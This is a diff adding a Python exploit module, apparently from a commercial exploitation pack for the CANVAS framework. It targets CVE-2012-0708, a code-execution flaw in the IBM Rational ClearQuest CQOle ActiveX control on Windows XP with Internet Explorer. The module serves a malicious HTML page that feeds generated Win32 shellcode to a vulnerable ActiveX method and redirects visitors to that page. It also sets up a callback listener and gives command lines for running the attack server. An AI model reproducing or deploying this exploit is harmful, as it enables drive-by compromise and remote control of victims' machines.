@@ -1,0 +1,133 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2012
+#
+
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import *
+from httpclientside import httpclientside
+
+import struct
+
+# GUI info
+NAME = "IBM Rational ClearQuest CQOle ActiveX Code Execution Vulnerability"
+
+DESCRIPTION = "Code Execution Vulnerability in IBM Rational ClearQuest CQOle ActiveX"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "IBM"
+DOCUMENTATION["Date public"] = "2012.06.28"
+DOCUMENTATION["VersionsAffected"] = "IBM Rational ClearQuest < 7.1.1.9, < 7.1.2.6, < 8.0.0.2"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-12-113/"
+DOCUMENTATION["CVE Name"] = "CVE-2012-0708"
+DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0708"
+DOCUMENTATION["Notes"] = ""
+
+VERSION='1.0'
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Clientside'
+PROPERTY['ARCH'] = [['Windows']]
+PROPERTY['VERSION'] = ['XP']
+
+NOTES="""
+Usage:
+.\commandlineInterface.py -p 443 -v 12
+.\exploits\httpserver\httpserver.py -v 1 -O singleexploit:d2sec_clearquest -l 192.168.133.1 -d 443 -p 80
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0:['Windows XP with IE'],
+}
+
+class theexploit(tcpexploit,httpclientside):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        httpclientside.__init__(self)
+        self.clientversion = 1
+        self.badstring = "\x00"
+        self.subesp = 0
+        self.name = NAME 
+        self.filename = "index.html"
+        return
+
+    def makefile(self):
+        filedata = """
+<HTML> 
+<BODY>
+ 
+<DIV id="targetDiv">
+
+</DIV>
+
+<SCRIPT language="javascript">  
+
+try {		
+	var detect = new ActiveXObject("CLEARQUEST.SESSION");
+	
+	if (detect) {	
+		document.getElementById("targetDiv").innerHTML = "<object classid='clsid:94773112-72E8-11D0-A42E-00A024DED613' id='target'>";				
+    
+    target.RegisterSchemaRepoFromFileByDbSet("D2D2D2D2", unescape('SHELLCODE'));
+	}
+}
+catch(e) {}
+
+</SCRIPT> 
+
+</BODY> 
+</HTML>        
+"""
+        filedata = filedata.replace('SHELLCODE', urluencode('AAAAAA' + self.shellcode))
+		
+        return filedata
+
+    def makesploit(self, clientheader, clientbody):        
+        from libs.spkproxy import header, body
+        h = header('SERVER')
+        b = body()
+        
+        if clientheader.URL.count(self.filename):
+            self.createShellcode()
+            sploitstring = self.makefile()            
+            b.setBody(sploitstring)
+        else:
+            self.log('Redirecting to self')
+            h.status = '302'
+            h.addHeader('Location', self.filename)
+            h.addHeader('Content-Type', 'binary/octet-stream')
+        return h, b
+
+    def neededListenerTypes(self):
+        from canvasengine import HTTPMOSDEF
+        return [HTTPMOSDEF]
+    
+    def createShellcode(self):
+        self.createWin32ClientSideShellcode()
+        return self.shellcode
+
+    def run(self):        
+        return 1
+
+if __name__=='__main__':
+    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
